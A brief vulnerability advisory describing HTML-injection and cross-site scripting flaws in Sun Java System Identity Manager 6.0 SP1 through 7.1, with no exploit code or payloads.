Sun Java System Identity Manager is prone to multiple input-validation vulnerabilities, including an HTML-injection issue and cross-site scripting issues, because it fails to adequately sanitize user-supplied input.

Attackers can exploit these issues to execute arbitrary HTML and script code in the context of the affected site. Successful exploits could allow an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.

Sun Java System Identity Manager 6.0 SP1, 6.0 SP2, 6.0 SP3, 7.0, and 7.1 are vulnerable.
